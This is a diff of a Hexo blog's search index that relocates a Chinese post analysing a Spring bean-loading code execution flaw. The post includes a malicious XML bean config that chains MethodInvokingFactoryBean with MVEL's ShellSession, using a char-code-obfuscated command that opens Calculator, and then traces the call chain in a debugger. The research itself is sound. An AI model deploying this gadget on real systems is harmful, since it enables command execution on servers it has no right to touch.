@@ -2773,6 +2773,170 @@
 ]]></content>
   </entry>
   <entry>
+    <title>Hello World</title>
+    <url>/2025/03/11/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>spring框架bean加载漏洞</title>
+    <url>/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>在Spring框架中，<strong>Bean</strong> 是一个非常重要的概念，它是Spring框架的核心组件之一。以下是对Bean的详细解释：</p>
+<h3 id="1-Bean的定义"><a href="#1-Bean的定义" class="headerlink" title="1. Bean的定义"></a>1. Bean的定义</h3><p>Bean是Spring框架中被管理的对象，通常是一个普通的Java类（POJO，Plain Old Java Object）。Spring通过依赖注入（DI）和控制反转（IoC）的机制来管理这些对象的生命周期、依赖关系和配置信息。</p>
+<h3 id="2-Bean的作用"><a href="#2-Bean的作用" class="headerlink" title="2. Bean的作用"></a>2. Bean的作用</h3><p>Bean在Spring框架中扮演着多种角色：</p>
+<ul>
+<li><strong>业务逻辑实现</strong>：Bean可以是实现具体业务逻辑的类，例如Service层的类，负责处理业务流程。</li>
+<li><strong>数据访问</strong>：Bean可以是数据访问层的类，例如DAO（Data Access Object）类，用于与数据库进行交互。</li>
+<li><strong>配置管理</strong>：Bean可以是配置类，用于定义应用程序的配置信息。</li>
+<li><strong>工具类</strong>：Bean也可以是工具类，提供一些通用的功能，例如日志记录、文件操作等。</li>
+</ul>
+<h3 id="3-Bean的生命周期"><a href="#3-Bean的生命周期" class="headerlink" title="3. Bean的生命周期"></a>3. Bean的生命周期</h3><p>Spring框架对Bean的生命周期进行了严格的管理，主要包括以下几个阶段：</p>
+<ul>
+<li><strong>实例化</strong>：Spring容器根据配置信息创建Bean的实例。</li>
+<li><strong>属性赋值</strong>：Spring容器将配置文件中定义的属性值注入到Bean实例中。</li>
+<li><strong>初始化</strong>：如果Bean实现了<code>InitializingBean</code>接口或定义了<code>init-method</code>，Spring容器会调用初始化方法。</li>
+<li><strong>使用</strong>：Bean实例被应用程序使用，执行业务逻辑。</li>
+<li><strong>销毁</strong>：当Spring容器关闭时，如果Bean实现了<code>DisposableBean</code>接口或定义了<code>destroy-method</code>，Spring容器会调用销毁方法。</li>
+</ul>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>高版本的Spring框架需要<strong>JDK17</strong> </p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-core&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;6.1.1&lt;/version&gt; &lt;!-- 替换为你的目标版本 --&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;6.1.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;6.1.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>一般spring系统都会带有相关的依赖可以支持我们通过xml文件去加载bean，依赖不一定是上面这个</p>
+<p><strong>能shell的类</strong> </p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.mvel&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;mvel2&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;2.4.4.Final&lt;/version&gt; &lt;!-- 你可以根据需要选择其他版本 --&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里我选择MVEL，我前面文章也有写MVEL依赖如何实现命令执行，他有多种方式可以实现</p>
+<p>参考链接 <a href="https://ro0ki1.github.io/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/">https://ro0ki1.github.io/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</a> </p>
+<h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.springframework.context.ApplicationContext;</span><br><span class="line">import org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line">public class Bean_test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;test.xml&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="漏洞xml配置文件"><a href="#漏洞xml配置文件" class="headerlink" title="漏洞xml配置文件"></a>漏洞xml配置文件</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans</span><br><span class="line">                           http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">    &lt;bean id=&quot;jndi&quot; class=&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot; init-method=&quot;getObject&quot;&gt;</span><br><span class="line">        &lt;property name=&quot;targetObject&quot;&gt;</span><br><span class="line">            &lt;bean class=&quot;org.mvel2.sh.ShellSession&quot;/&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">        &lt;property name=&quot;targetMethod&quot; value=&quot;exec&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;arguments&quot;</span><br><span class="line">                  value=&quot;push Runtime.getRuntime().exec(String.valueOf((char)111)+String.valueOf((char)112)+String.valueOf((char)101)+String.valueOf((char)110)+String.valueOf((char)32)+String.valueOf((char)45)+String.valueOf((char)97)+String.valueOf((char)32)+String.valueOf((char)67)+String.valueOf((char)97)+String.valueOf((char)108)+String.valueOf((char)99)+String.valueOf((char)117)+String.valueOf((char)108)+String.valueOf((char)97)+String.valueOf((char)116)+String.valueOf((char)111)+String.valueOf((char)114));&quot;/&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里先初步说一下重点。还没链子明白了再细说一下恶意文件怎么改</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315000112008.png"
+                      class="" title="image-20250315000112008"
+                > 
+
+<p>样例测试</p>
+<p>可以注意一下目录结构，加载文件是加载resources这个目录下的</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004836973.png"
+                      class="" title="image-20250315004836973"
+                > 
+
+<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>因为我们会用到这个类MethodInvokingFactoryBean.class，我们给他所有方法打上断点，毕竟不知道哪里会给断下来</p>
+<p>想要分析细节一点，所以我们得往上找调用栈</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315002937211.png"
+                      class="" title="image-20250315002937211"
+                > 
+
+<p>bean是我们的MethodInvokingFactoryBean.，调用了他的afterPropertiesSet的方法</p>
+<p>afterPropertiesSet()</p>
+<h4 id="this-prepare"><a href="#this-prepare" class="headerlink" title="this.prepare()"></a>this.prepare()</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003012237.png"
+                      class="" title="image-20250315003012237"
+                > 
+
+<p>看下这个prepare干了什么</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003210313.png"
+                      class="" title="image-20250315003210313"
+                >  
+
+<p>看他获取了我们xml文件里面的targetClass，targetMethod，arguments存着参数</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003714215.png"
+                      class="" title="image-20250315003714215"
+                > 
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003616973.png"
+                      class="" title="image-20250315003616973"
+                > 
+
+<p>利用反射去获取了方法</p>
+<h4 id="this-invokeWithTargetException"><a href="#this-invokeWithTargetException" class="headerlink" title="this.invokeWithTargetException()"></a>this.invokeWithTargetException()</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004053199.png"
+                      class="" title="image-20250315004053199"
+                >  
+
+<p>这个函数里面又调用了invoke</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003906114.png"
+                      class="" title="image-20250315003906114"
+                > 
+
+<p>这里最后利用反射造成命令执行</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004140424.png"
+                      class="" title="image-20250315004140424"
+                > 
+
+<p>后续就是MVEL利用ShellSession的exec方法传入恶意String字符串造成命令执行。</p>
+<h2 id="恶意xml文件分析"><a href="#恶意xml文件分析" class="headerlink" title="恶意xml文件分析"></a>恶意xml文件分析</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004352831.png"
+                      class="" title="image-20250315004352831"
+                > 
+
+<p>利用spring底层这个类，它会实例化我们的targetObject类，然后利用反射去执行targetMethod方法</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004447540.png"
+                      class="" title="image-20250315004447540"
+                > 
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>漏洞原理分析</category>
+      </categories>
+  </entry>
+  <entry>
     <title>gophish钓鱼平台使用</title>
     <url>/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<p>Gophish是为企业和渗透测试人员设计的开源网络钓鱼工具包。 它提供了快速，轻松地设置和执行网络钓鱼攻击以及安全意识培训的能力。</p>
@@ -3056,170 +3220,6 @@
       <tags>
         <tag>gophish</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2025/03/11/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>spring框架bean加载漏洞</title>
-    <url>/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>在Spring框架中，<strong>Bean</strong> 是一个非常重要的概念，它是Spring框架的核心组件之一。以下是对Bean的详细解释：</p>
-<h3 id="1-Bean的定义"><a href="#1-Bean的定义" class="headerlink" title="1. Bean的定义"></a>1. Bean的定义</h3><p>Bean是Spring框架中被管理的对象，通常是一个普通的Java类（POJO，Plain Old Java Object）。Spring通过依赖注入（DI）和控制反转（IoC）的机制来管理这些对象的生命周期、依赖关系和配置信息。</p>
-<h3 id="2-Bean的作用"><a href="#2-Bean的作用" class="headerlink" title="2. Bean的作用"></a>2. Bean的作用</h3><p>Bean在Spring框架中扮演着多种角色：</p>
-<ul>
-<li><strong>业务逻辑实现</strong>：Bean可以是实现具体业务逻辑的类，例如Service层的类，负责处理业务流程。</li>
-<li><strong>数据访问</strong>：Bean可以是数据访问层的类，例如DAO（Data Access Object）类，用于与数据库进行交互。</li>
-<li><strong>配置管理</strong>：Bean可以是配置类，用于定义应用程序的配置信息。</li>
-<li><strong>工具类</strong>：Bean也可以是工具类，提供一些通用的功能，例如日志记录、文件操作等。</li>
-</ul>
-<h3 id="3-Bean的生命周期"><a href="#3-Bean的生命周期" class="headerlink" title="3. Bean的生命周期"></a>3. Bean的生命周期</h3><p>Spring框架对Bean的生命周期进行了严格的管理，主要包括以下几个阶段：</p>
-<ul>
-<li><strong>实例化</strong>：Spring容器根据配置信息创建Bean的实例。</li>
-<li><strong>属性赋值</strong>：Spring容器将配置文件中定义的属性值注入到Bean实例中。</li>
-<li><strong>初始化</strong>：如果Bean实现了<code>InitializingBean</code>接口或定义了<code>init-method</code>，Spring容器会调用初始化方法。</li>
-<li><strong>使用</strong>：Bean实例被应用程序使用，执行业务逻辑。</li>
-<li><strong>销毁</strong>：当Spring容器关闭时，如果Bean实现了<code>DisposableBean</code>接口或定义了<code>destroy-method</code>，Spring容器会调用销毁方法。</li>
-</ul>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>高版本的Spring框架需要<strong>JDK17</strong> </p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-core&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;6.1.1&lt;/version&gt; &lt;!-- 替换为你的目标版本 --&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;6.1.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;6.1.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
-
-<p>一般spring系统都会带有相关的依赖可以支持我们通过xml文件去加载bean，依赖不一定是上面这个</p>
-<p><strong>能shell的类</strong> </p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.mvel&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;mvel2&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;2.4.4.Final&lt;/version&gt; &lt;!-- 你可以根据需要选择其他版本 --&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
-
-<p>这里我选择MVEL，我前面文章也有写MVEL依赖如何实现命令执行，他有多种方式可以实现</p>
-<p>参考链接 <a href="https://ro0ki1.github.io/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/">https://ro0ki1.github.io/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</a> </p>
-<h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.springframework.context.ApplicationContext;</span><br><span class="line">import org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line">public class Bean_test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;test.xml&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="漏洞xml配置文件"><a href="#漏洞xml配置文件" class="headerlink" title="漏洞xml配置文件"></a>漏洞xml配置文件</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans</span><br><span class="line">                           http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">    &lt;bean id=&quot;jndi&quot; class=&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot; init-method=&quot;getObject&quot;&gt;</span><br><span class="line">        &lt;property name=&quot;targetObject&quot;&gt;</span><br><span class="line">            &lt;bean class=&quot;org.mvel2.sh.ShellSession&quot;/&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">        &lt;property name=&quot;targetMethod&quot; value=&quot;exec&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;arguments&quot;</span><br><span class="line">                  value=&quot;push Runtime.getRuntime().exec(String.valueOf((char)111)+String.valueOf((char)112)+String.valueOf((char)101)+String.valueOf((char)110)+String.valueOf((char)32)+String.valueOf((char)45)+String.valueOf((char)97)+String.valueOf((char)32)+String.valueOf((char)67)+String.valueOf((char)97)+String.valueOf((char)108)+String.valueOf((char)99)+String.valueOf((char)117)+String.valueOf((char)108)+String.valueOf((char)97)+String.valueOf((char)116)+String.valueOf((char)111)+String.valueOf((char)114));&quot;/&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure></div>
-
-<p>这里先初步说一下重点。还没链子明白了再细说一下恶意文件怎么改</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315000112008.png"
-                      class="" title="image-20250315000112008"
-                > 
-
-<p>样例测试</p>
-<p>可以注意一下目录结构，加载文件是加载resources这个目录下的</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004836973.png"
-                      class="" title="image-20250315004836973"
-                > 
-
-<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>因为我们会用到这个类MethodInvokingFactoryBean.class，我们给他所有方法打上断点，毕竟不知道哪里会给断下来</p>
-<p>想要分析细节一点，所以我们得往上找调用栈</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315002937211.png"
-                      class="" title="image-20250315002937211"
-                > 
-
-<p>bean是我们的MethodInvokingFactoryBean.，调用了他的afterPropertiesSet的方法</p>
-<p>afterPropertiesSet()</p>
-<h4 id="this-prepare"><a href="#this-prepare" class="headerlink" title="this.prepare()"></a>this.prepare()</h4><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003012237.png"
-                      class="" title="image-20250315003012237"
-                > 
-
-<p>看下这个prepare干了什么</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003210313.png"
-                      class="" title="image-20250315003210313"
-                >  
-
-<p>看他获取了我们xml文件里面的targetClass，targetMethod，arguments存着参数</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003714215.png"
-                      class="" title="image-20250315003714215"
-                > 
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003616973.png"
-                      class="" title="image-20250315003616973"
-                > 
-
-<p>利用反射去获取了方法</p>
-<h4 id="this-invokeWithTargetException"><a href="#this-invokeWithTargetException" class="headerlink" title="this.invokeWithTargetException()"></a>this.invokeWithTargetException()</h4><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004053199.png"
-                      class="" title="image-20250315004053199"
-                >  
-
-<p>这个函数里面又调用了invoke</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003906114.png"
-                      class="" title="image-20250315003906114"
-                > 
-
-<p>这里最后利用反射造成命令执行</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004140424.png"
-                      class="" title="image-20250315004140424"
-                > 
-
-<p>后续就是MVEL利用ShellSession的exec方法传入恶意String字符串造成命令执行。</p>
-<h2 id="恶意xml文件分析"><a href="#恶意xml文件分析" class="headerlink" title="恶意xml文件分析"></a>恶意xml文件分析</h2><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004352831.png"
-                      class="" title="image-20250315004352831"
-                > 
-
-<p>利用spring底层这个类，它会实例化我们的targetObject类，然后利用反射去执行targetMethod方法</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
